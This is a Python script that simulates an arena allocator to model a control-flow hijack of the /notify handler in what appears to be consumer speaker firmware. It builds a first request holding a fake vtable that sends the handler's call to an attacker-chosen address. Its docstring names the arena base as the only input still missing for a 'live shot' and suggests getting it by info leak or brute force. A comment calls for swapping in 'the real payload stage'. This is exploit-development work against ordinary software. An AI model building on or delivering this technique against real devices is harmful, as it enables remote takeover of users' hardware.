#!/usr/bin/env python3
"""Arena-dispatch model for the 57.23 /notify singleton (beads frankensonos-fbkv/mgs7).

The /notify handler loads vt = *(session+5369 arena image) and calls fn = *(vt+0x2c).
The SocketManager arena is BUMP-ONLY: the dispatch is shaped entirely by the FIRST
post-boot request-path allocation (0x10222314 via 0x1021ed78) — N later allocations
never revisit offset 5369.

Model results (this file, run it):
  generic-only traffic:  vt = 'GET ' (0x47455420), fn = wild  -> matches the device
                         14-36 s kill signature for every N
  shaped first request:  vt = self-referential fake vtable inside the SAME allocation,
                         fn = attacker-chosen (model uses 0x101e3990) -> CONTROL=YES
                         for every N

The one missing input for the live shot: the arena base address (deterministic per
boot; recover via info leak / boot replay / brute).
"""
import struct

class Arena:
    def __init__(self, size=8192, base=0x58000000):
        self.base=base; self.size=size; self.bump=0; self.mem=bytearray(size)
    def boot(self, sz, c=b''):
        b=self.bump; self.bump+=sz; self.mem[b:b+len(c)]=c; return b
    def req(self, c):
        sz=len(c); al=(sz+7)&~7; b=self.bump
        if b+al>self.size: return None
        self.mem[b:b+sz]=c; self.bump+=al; return b
    def read(self,o,n):
        if o<0 or o+n>self.size: return b'\0'*n
        return bytes(self.mem[o:o+n])

TARGET=0x101e3990  # 'li r3,1; blr' in-binary (non-PIE); swap for the real payload stage

def run(N, base=0x58000000, shape=True, target=TARGET):
    a=Arena(8192,base)
    a.boot(5368,b'\xAA'*5368); a.boot(1,b'\x00')
    if shape:
        vt_addr=a.base+a.bump+64
        req=bytearray(b'B'*128)
        req[0:4]=struct.pack('>I',vt_addr)
        req[64+0x2c:64+0x30]=struct.pack('>I',target)
        a.req(bytes(req))
        for i in range(max(0,N-1)):
            a.req((f'GET /status/zp?i={i} HTTP/1.1\r\n\r\n').encode())
    else:
        for i in range(N):
            a.req((f'GET /status/zp?i={i} HTTP/1.1\r\n\r\n').encode())
    vt=struct.unpack('>I',a.read(5369,4))[0]
    in_arena = base<=vt<base+8192
    fn=struct.unpack('>I',a.read((vt-base)+0x2c,4))[0] if in_arena else None
    return vt,fn,in_arena

if __name__=='__main__':
    print('shaped-first (control):')
    for N in (1,2,3,5,10,20):
        vt,fn,ok=run(N,shape=True)
        print(f'  N={N:3d} vt={hex(vt)} fn={hex(fn) if fn is not None else "wild"} control={fn==TARGET}')
    print('generic-only (device kill shape):')
    for N in (1,2,3,5):
        vt,fn,ok=run(N,shape=False)
        print(f'  N={N:3d} vt={hex(vt)} fn={"in-arena "+hex(fn) if fn is not None else "WILD"}')
